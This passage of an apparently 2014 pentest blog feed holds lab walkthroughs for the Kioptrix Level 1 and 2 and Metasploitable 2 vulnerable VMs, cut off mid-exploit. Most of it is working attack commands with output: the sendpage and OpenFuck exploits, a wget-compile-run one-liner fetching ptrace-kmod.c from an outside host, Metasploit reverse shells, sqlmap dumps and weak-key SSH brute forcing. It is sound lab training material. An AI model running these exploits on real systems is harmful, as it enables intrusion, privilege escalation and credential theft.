Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
 13:15:37 up  2:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
</code></p>

<p>It&rsquo;s time for privilege escalation! I will use the sendpage exploit:</p>

<p><code>plain
cp /usr/share/exploitdb/platforms/linux/local/9545.c ~/sendpage.c
nc -vv -l -p 5555 &lt; sendpage.c
</code></p>

<p>And from the shell:</p>

<p><code>plain
sh-3.00# wget 192.168.127.159 -O /tmp/sendpage.c
sh-3.00# cd /tmp
sh-3.00# gcc -o sendpage sendpage.c
sh-3.00# chmod a+x sendpage
sh-3.00# ./sendpage
sh: no job control in this shell
sh-3.00# whoami
root
</code></p>

<h3>Breaking into the database</h3>

<p>I will now explore a different attack vector, by using <strong>sqlmap</strong> to dump the juicy stuff of the database.</p>

<p><code>plain
sqlmap -u "http://192.168.127.162/index.php" --dbms=MySQL --dump --data "uname=test&amp;psw=pass" --level=5 --risk=3
Database: webapp
Table: users
[2 entries]
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | 5afac8d85f |
| 2  | john     | 66lajGGbla |
+----+----------+------------+
</code></p>

<p>I couldn&rsquo;t connect to the MySQL database though, so didn&rsquo;t find a use for these credentials.</p>

<p>I also tried an exploit against the CUPS daemon, to no avail. So I guess this is it for level 2.</p>

<blockquote><p>You have an unusual magnetic personality.  Don&rsquo;t walk too close to
metal objects which are not fastened down.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 1]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1/"/>
    <updated>2014-06-12T22:45:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>For today&rsquo;s pentest lab, I will use the Kioptrix Level 1 virtual machine as the target. Kioptrix Level 1 is the first in a series of vulnerable machines for beginner penetration testing practice.</p>

<!-- more -->


<p>First, to get its IP address, I had to ping sweep the subnet with the following command:</p>

<p><code>plain
nmap -sP 192.168.127.0/24
</code></p>

<p>By correlating the MAC address information from the scan with that from VMware, I now know the IP for the machine is 192.168.127.153.</p>

<p>Now, port scan the target:</p>

<p>``` plain
root@kali:~# nmap -A -p1-65535 192.168.127.153</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-12 22:56 EEST
Nmap scan report for 192.168.127.153
Host is up (0.00035s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|<em>ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|</em>sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|<em>  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|</em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|<em>http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=&mdash;
| Not valid before: 2009-09-26T08:32:06+00:00
|</em>Not valid after:  2010-09-26T08:32:06+00:00
|<em>ssl-date: 2014-06-12T19:58:14+00:00; +1m51s from local time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|</em>    SSL2_RC4_128_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
MAC Address: 00:0C:29:1A:EE:9E (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 &ndash; 2.4.18 (likely embedded)
Network Distance: 1 hop</p>

<p>Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.127.153</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
```</p>

<h3>Port 22 ssh</h3>

<p>According to Nessus, the SSH version is vulnerable to CVE-2002-0083:</p>

<blockquote><p>Versions prior than 3.1 are vulnerable to an off by one error that allows local users to gain root access, and it may be
possible for remote users to similarly compromise the daemon for remote access.
In addition, a vulnerable SSH client may be compromised by connecting to a malicious SSH daemon that exploits this
vulnerability in the client code, thus compromising the client system.</p></blockquote>

<p>I searched, but I couldn&rsquo;t find a suitable exploit for this, so will leave it at this.</p>

<h3>Port 80 / 443 apache ssl</h3>

<p>Now let&rsquo;s try that outdated Apache server. Here are the results from a Nikto scan against it:</p>

<p>``` plain
root@kali:~# nikto -host 192.168.127.153</p>

<h2>&ndash; Nikto v2.1.6</h2>

<ul>
<li>Target IP:          192.168.127.153</li>
<li>Target Hostname:    192.168.127.153</li>
<li>Target Port:        80

<ul>
<li>Start Time:         2014-06-13 00:13:08 (GMT3)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</li>
<li>Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 06:12:46 2001</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>OSVDB-27487: Apache is vulnerable to XSS via the Expect header</li>
<li>Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
<li>mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</li>
<li>OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.</li>
<li>OSVDB-637: Enumeration of users is possible by requesting ~username (responds with &lsquo;Forbidden&rsquo; for users, &lsquo;not found&rsquo; for non-existent users).</li>
<li>Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>OSVDB-838: Apache/1.3.20 &ndash; Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</li>
<li>OSVDB-4552: Apache/1.3.20 &ndash; Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</li>
<li>OSVDB-2733: Apache/1.3.20 &ndash; Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</li>
<li>mod_ssl/2.8.4 &ndash; mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</li>
<li>///etc/hosts: The server install allows reading of any system file by adding an extra &lsquo;/&rsquo; to the URL.</li>
<li>OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). <a href="http://www.cert.org/advisories/CA-2000-02.html.">http://www.cert.org/advisories/CA-2000-02.html.</a></li>
<li>OSVDB-3268: /manual/: Directory indexing found.</li>
<li>OSVDB-3092: /manual/: Web server manual found.</li>
<li>OSVDB-3268: /icons/: Directory indexing found.</li>
<li>OSVDB-3233: /icons/README: Apache default file found.</li>
<li>OSVDB-3092: /test.php: This might be interesting&hellip;</li>
<li>7355 requests: 0 error(s) and 20 item(s) reported on remote host

<ul>
<li>End Time:           2014-06-13 00:13:52 (GMT3) (44 seconds)</li>
</ul>
</li>
</ul>


<hr />

<ul>
<li>1 host(s) tested
```</li>
</ul>


<p>The interesting line that will lead to the exploit is this one:</p>

<p><strong>+ mod_ssl/2.8.4 &ndash; mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</strong></p>

<blockquote><p>mod_ssl &lt; 2.8.7 is vulnerable to a remotely exploitable buffer overflow when attempting to cache SSL sessions. This allows for remote code > execution, and the modification of any file on the system.</p></blockquote>

<p>An exploit is available at <a href="http://www.exploit-db.com/exploits/764/">http://www.exploit-db.com/exploits/764/</a></p>

<p>Before jumping in, a little modification is necessary because the exploit is old. If we try to compile right away we will get a bunch of errors. So let&rsquo;s make the changes.</p>

<p>If you don&rsquo;t already have it, install the libssl-dev library:</p>

<p><code>plain
 apt-get install libssl-dev
</code></p>

<p>Now add the following lines in the C source code:</p>

<p>``` plain</p>

<h1>include &lt;openssl/rc4.h></h1>

<h1>include &lt;openssl/md5.h></h1>

<p>```</p>

<p>Next, search for wget in the source and replace the URL with the newer one:</p>

<p><code>plain
http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
</code></p>

<p>In the <em>get_server_hello</em> function, change the declaration</p>

<p><code>plain
unsigned char *p, *end;
</code></p>

<p>to</p>

<p><code>plain
const unsigned char *p, *end;
</code></p>

<p>Now we can compile the exploit:</p>

<p><code>plain
gcc -o openfuck openfuck.c -lcrypto
</code></p>

<p>Now, if you run it, you will see a range of supported offsets. From our previous scan, we know those applicable to our target are the redhat 1.3.20 versions. We can manually search for them in the offsets or run the following:</p>

<p><code>plain
./openfuck | grep -i redhat | grep "1.3.20"
</code></p>

<p>This will give us 2 offsets:</p>

<p>``` plain
0x6a &ndash; RedHat Linux 7.2 (apache-1.3.20-16)1</p>

<p>0x6b &ndash; RedHat Linux 7.2 (apache-1.3.20-16)2
```</p>

<p>So, let&rsquo;s try it out:</p>

<p>``` plain
./openfuck 0x6a 192.168.127.153 443</p>

<p>Establishing SSL connection</p>

<p>cipher: 0x4043808c   ciphers: 0x80fe500</p>

<p>Ready to send shellcode</p>

<p>Spawning shell&hellip;</p>

<p>Good Bye!
```</p>

<p>Ok, that one didn&rsquo;t work. Let&rsquo;s try the other one:</p>

<p>``` plain
./openfuck 0x6b 192.168.127.153 443</p>

<p>Establishing SSL connection</p>

<p>cipher: 0x4043808c   ciphers: 0x80fc4e8</p>

<p>Ready to send shellcode</p>

<p>Spawning shell&hellip;</p>

<p>bash: no job control in this shell</p>

<p>bash-2.05$</p>

<p>bash-2.05$ unset HISTFILE; cd /tmp; wget <a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;</a> gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;</p>

<p>&mdash;14:29:59&mdash;  <a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a></p>

<pre><code>       =&gt; `ptrace-kmod.c'
</code></pre>

<p>Connecting to dl.packetstormsecurity.net:80&hellip; connected!</p>

<p>HTTP request sent, awaiting response&hellip; 200 OK</p>

<p>Length: 3,921 [text/x-csrc]</p>

<pre><code>0K ...                                                   100% @   3.74 MB/s
</code></pre>

<p>14:30:00 (3.74 MB/s) &ndash; `ptrace-kmod.c' saved [3921/3921]</p>

<p>[+] Attached to 1444</p>

<p>[+] Waiting for signal</p>

<p>[+] Signal caught</p>

<p>[+] Shellcode placed at 0x4001189d</p>

<p>[+] Now wait for suid shell&hellip;</p>

<p>whoami</p>

<p>root
```</p>

<p>And we got a shell!</p>

<h3>Port 139 samba</h3>

<p>The exploit for this is available in Metasploit:</p>

<p><strong>Samba trans2open Overflow (Linux x86)</strong></p>

<blockquote><p>This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 > Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they
apparently do not allow anonymous access to IPC.</p></blockquote>

<p>``` plain
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > show options</p>

<p>Module options (exploit/linux/samba/trans2open):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST                   yes       The target address
   RPORT  139              yes       The target port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Samba 2.2.x &ndash; Bruteforce</p>

<p>msf exploit(trans2open) > set RHOST 192.168.127.153
RHOST => 192.168.127.153
msf exploit(trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(trans2open) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(trans2open) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Trying return address 0xbffffdfc&hellip;
[<em>] Trying return address 0xbffffcfc&hellip;
[</em>] Trying return address 0xbffffbfc&hellip;
[<em>] Trying return address 0xbffffafc&hellip;
[</em>] Trying return address 0xbffff9fc&hellip;
[<em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.153:1047) at 2014-06-13 00:31:15 +0300
[</em>] Command shell session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.153:1048) at 2014-06-13 00:31:15 +0300</p>

<p>whoami
root
```</p>

<p>There is a flag present on this machine, which is located here:</p>

<p><code>/var/spool/mail/root</code></p>

<blockquote><p>If you are reading this, you got root. Congratulations.
Level 2 won&rsquo;t be as easy&hellip;</p></blockquote>

<p>And this was the first level in the Kioptrix series. Here&rsquo;s a cookie till next time:</p>

<blockquote><p>You&rsquo;re a card which will have to be dealt with.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Metasploitable 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/"/>
    <updated>2014-06-03T21:16:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through different ways of exploiting Metasploitable 2, the newer release of Rapid7&rsquo;s popular vulnerable machine. First, what is Metasploitable?</p>

<!-- more -->


<blockquote><p>Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be
used to conduct security training, test security tools, and practice common
penetration testing techniques.</p></blockquote>

<p>In my lab environment, the IP of the attacker machine is 192.168.127.159, and the victim machine is 192.168.127.154.</p>

<p>Since this is a test lab, I won&rsquo;t be concerned about stealth. Instead, I will try to get the most information out of the scans.</p>

<p>Let&rsquo;s start by port scanning the target with nmap. I did a full port, aggresive scan against the target. Here are the results.</p>

<p>``` plain
nmap -p1-65535 -A 192.168.127.154</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-03 21:33 EEST
Nmap scan report for 192.168.127.154
Host is up (0.00047s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|<em>ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|</em>  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|<em>smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45+00:00
|</em>Not valid after:  2010-04-16T13:07:45+00:00
|<em>ssl-date: 2014-06-03T18:35:26+00:00; -1s from local time.
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid:
|</em>  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|</em>http-title: Metasploitable2 &ndash; Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      46385/tcp  mountd
|   100005  1,2,3      47809/udp  mountd
|   100021  1,3,4      47120/udp  nlockmgr
|   100021  1,3,4      53013/tcp  nlockmgr
|   100024  1          34130/tcp  status
|<em>  100024  1          45305/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    Java RMI Registry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      46385/tcp  mountd
|   100005  1,2,3      47809/udp  mountd
|   100021  1,3,4      47120/udp  nlockmgr
|   100021  1,3,4      53013/tcp  nlockmgr
|   100024  1          34130/tcp  status
|</em>  100024  1          45305/udp  status
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 53
|   Version: .0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: ConnectWithDatabase, SwitchToSSLAfterHandshake, Support41Auth, SupportsTransactions, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
|   Status: Autocommit
|<em>  Salt: (eFoz:O<sup>m</sup>'yLR5Qw&amp;RJ\
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 &ndash; 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|</em>    Unknown security type (33554432)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         Unreal ircd
| irc-info:
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
|   servers: 1
|   users: 1
|   lservers: 0
|   lusers: 1
|   uptime: 0 days, 0:07:28
|   source host: 7FA0EA81.B1DFC955.FFFA6D49.IP
|<em>  source ident: nmap
6697/tcp  open  irc         Unreal ircd
8009/tcp  open  ajp13?
| ajp-auth:
|</em>  ERROR: Failed to connect to AJP server
| ajp-methods:
|<em>  ERROR: Failed to connect to server
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
34130/tcp open  status      1 (RPC #100024)
46385/tcp open  mountd      1-3 (RPC #100005)
50867/tcp open  unknown
53013/tcp open  nlockmgr    1-4 (RPC #100021)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      46385/tcp  mountd
|   100005  1,2,3      47809/udp  mountd
|   100021  1,3,4      47120/udp  nlockmgr
|   100021  1,3,4      53013/tcp  nlockmgr
|   100024  1          34130/tcp  status
|</em>  100024  1          45305/udp  status
MAC Address: 00:0C:29:2E:6D:70 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Host script results:
|<em>nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP
|</em>  System time: 2014-06-03T14:35:26-04:00</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.127.154</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 284.64 seconds
```</p>

<p>Ok, there are plenty of services just waiting for our attention. So let&rsquo;s check each port and see what we get.</p>

<h3>Port 21 vsftpd</h3>

<p>There is an exploit available in Metasploit for the vsftpd version.</p>

<p>``` plain
msf > search vsftpd</p>

<h1>Matching Modules</h1>

<p>   Name                                  Disclosure Date  Rank       Description</p>

<hr />

<p>   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```</p>

<p>The description from Rapid7 site:</p>

<p><strong>VSFTPD v2.3.4 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the
vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was
removed on July 3rd 2011.</p></blockquote>

<p>Let&rsquo;s leverage it and get a shell:</p>

<p>``` plain
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show options</p>

<p>Module options (exploit/unix/ftp/vsftpd_234_backdoor):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST                   yes       The target address
   RPORT  21               yes       The target port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(vsftpd_234_backdoor) > show payloads</p>

<h1>Compatible Payloads</h1>

<p>   Name               Disclosure Date  Rank    Description</p>

<hr />

<p>   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection</p>

<p>msf exploit(vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact
msf exploit(vsftpd_234_backdoor) > show options</p>

<p>Module options (exploit/unix/ftp/vsftpd_234_backdoor):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   RHOST  192.168.127.154  yes       The target address
   RPORT  21               yes       The target port</p>

<p>Payload options (cmd/unix/interact):</p>

<p>   Name  Current Setting  Required  Description</p>

<hr />

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(vsftpd_234_backdoor) > exploit</p>

<p>[<em>] Banner: 220 (vsFTPd 2.3.4)
[</em>] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling&hellip;
[+] UID: uid=0(root) gid=0(root)
[<em>] Found shell.
[</em>] Command shell session 1 opened (192.168.127.159:57936 &ndash;> 192.168.127.154:6200) at 2014-06-03 22:42:36 +0300</p>

<p>whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```</p>

<p>Aaand we own the machine! Now let&rsquo;s move on.</p>

<h3>Port 22 ssh</h3>

<p>The OpenSSL package installed on the system is vulnerable to a bruteforce exploit  due to a random number generator weakness. Here&rsquo;s the overview and the CVE number:</p>

<p><strong>CVE-2008-0166</strong></p>

<blockquote><p>OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable > numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.</p></blockquote>

<p>I chose the following Ruby exploit:</p>

<p><a href="http://www.exploit-db.com/exploits/5632/">http://www.exploit-db.com/exploits/5632/</a></p>

<p>Before running it, you have to download the precalculated vulnerable keys from:</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_dsa_1024_x86.tar.bz2</a>  # for dsa keys</p>

<p><a href="http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2">http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2</a> # for rsa keys</p>

<p>Then I ran the script as follows:</p>

<p><code>plain
ruby ./5632.rb 192.168.127.154 root ~/rsa/2048/
</code></p>

<p>You can consult the source for more information, basically this checks if the root account has a weak SSH key, testing each key in the directory where you placed the keys. Upon a hit, you will see something like this:</p>

<p>``` plain
KEYFILE FOUND:</p>

<p>57c3115d77c56390332dc5c49978627a-5429
```</p>

<p>After finding the key, you can use it to log in as root via ssh:</p>

<p><code>plain
ssh -l root -p 22 -i 57c3115d77c56390332dc5c49978627a-5429 192.168.127.154
</code></p>

<h3>Port 23 telnet</h3>

<p>For this one I used an auxiliary module:</p>

<p>``` plain
msf > use auxiliary/scanner/telnet/telnet_version
msf auxiliary(telnet_version) > show options</p>

<p>Module options (auxiliary/scanner/telnet/telnet_version):</p>

<p>   Name      Current Setting  Required  Description</p>

<hr />

<p>   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     23               yes       The target port
   THREADS   1                yes       The number of concurrent threads
   TIMEOUT   30               yes       Timeout for the Telnet probe
   USERNAME                   no        The username to authenticate as</p>

<p>msf auxiliary(telnet_version) > set RHOSTS 192.168.127.154
RHOSTS => 192.168.127.154
msf auxiliary(telnet_version) > run</p>

<p>[<em>] 192.168.127.154:23 TELNET _                  _       _ _        _     _      <em><em><strong>  \x0a _ </strong> </em><strong>   </strong></em>| |<em> <strong> _ </strong></em> _ <strong> | | </strong><em> (</em>) |<em> __ </em>| |<strong> | | </strong><em>|</em><strong> \ \x0a| &lsquo;_ <code>_ \ / _ \ __/ _</code> / </strong>| &rsquo;<em> \| |/ _ \| | __/ </em>` | &lsquo;<em> \| |/ _ \ <strong>) |\x0a| | | | | |  </strong>/ || (</em>| _<em> \ |</em>) | | (<em>) | | || (</em>| | |<em>) | |  <strong>// </strong>/ \x0a|</em>| |<em>| |</em>|_<strong>|_<em>_</em>,<em>|</em></strong>/ .<strong>/|_|_</strong>/|<em>|_</em>_<em>,</em>|<em>.__/|</em>|_<strong>|</strong><em>__|\x0a                            |</em>|                                          \x0a\x0a\x0aWarning: Never expose this VM to an untrusted network!\x0a\x0aContact: msfdev[at]metasploit.com\x0a\x0aLogin with msfadmin/msfadmin to get started\x0a\x0a\x0ametasploitable login:
[</em>] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```</p>

<p>So now we know the credentials for the msfadmin account, and if you log in and play around you will find out that this accound has sudo privilege, so it&rsquo;s possible to run commands as root.</p>

<h3>Port 80 apache</h3>

<p>Navigating to the root of the web server, we can see some vulnerable web applications, along with the msfadmin account details which we got earlier with telnet. I won&rsquo;t go over the web applications here, because I am focusing on host based exploitation in this post. However, I found out that I could use Metasploit against one of them to get a shell, so I will detail that here.</p>

<p>The Nessus scan revealed that the TWiki web application is vulnerable to remote code execution. I found the following suitable exploit:</p>

<p><strong>TWiki History TWikiUsers rev Parameter Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability in the history component of TWiki. By passing a &lsquo;rev&rsquo; parameter containing shell metacharacters to the
TWikiUsers script, an attacker can execute arbitrary OS commands.</p></blockquote>

<p>``` plain
msf > use exploit/unix/webapp/twiki_history
msf exploit(twiki_history) > show options</p>

<p>Module options (exploit/unix/webapp/twiki_history):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   Proxies                   no        Use a proxy chain
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /twiki/bin       yes       TWiki bin directory path
   VHOST                     no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic</p>

<p>msf exploit(twiki_history) > set RHOST 192.168.127.154
RHOST => 192.168.127.154
msf exploit(twiki_history) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(twiki_history) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
[</em>] Command: echo ZeiYbclsufvu4LGM;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Successfully sent exploit request
[<em>] Reading from socket B
[</em>] B: &ldquo;ZeiYbclsufvu4LGM\r\n&rdquo;
[<em>] Matching&hellip;
